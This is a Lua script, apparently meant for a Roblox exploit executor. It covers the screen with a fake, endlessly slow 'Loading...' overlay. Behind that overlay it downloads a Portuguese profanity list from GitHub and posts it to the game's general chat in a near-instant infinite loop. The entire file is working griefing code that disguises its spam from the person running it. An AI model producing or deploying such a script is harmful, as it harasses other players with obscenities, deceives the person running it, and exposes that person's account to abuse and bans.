local CoreGui = game:GetService("CoreGui")
local TextChatService = game:GetService("TextChatService")

local RAW_URL = "https://raw.githubusercontent.com/LDNOOBW/List-of-Dirty-Naughty-Obscene-and-Otherwise-Bad-Words/refs/heads/master/pt"

local old = CoreGui:FindFirstChild("InfiniteLoading")
if old then
	old:Destroy()
end

local Gui = Instance.new("ScreenGui")
Gui.Name = "InfiniteLoading"
Gui.IgnoreGuiInset = true
Gui.ResetOnSpawn = false
Gui.Parent = CoreGui

local Background = Instance.new("Frame")
Background.Size = UDim2.fromScale(100, 100)
Background.Position = UDim2.fromScale(-49.5, -49.5)
Background.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Background.BorderSizePixel = 0
Background.Parent = Gui

local Text = Instance.new("TextLabel")
Text.Size = UDim2.fromScale(0.5, 0.12)
Text.Position = UDim2.fromScale(0.25, 0.44)
Text.BackgroundTransparency = 1
Text.TextColor3 = Color3.new(1, 1, 1)
Text.TextScaled = true
Text.Font = Enum.Font.GothamBold
Text.Text = "Loading... 0%"
Text.Parent = Background

local progress = 0

local content = game:HttpGet(RAW_URL)

task.spawn(function()
	while true do
		TextChatService.TextChannels.RBXGeneral:SendAsync(content)
		task.wait(0.000001)
	end
end)

while true do
	task.wait(120)

	progress += 0.1

	if progress > 1 then
		progress = 0
	end

	Text.Text = "Loading... " .. math.floor(progress * 100) .. "%"
end
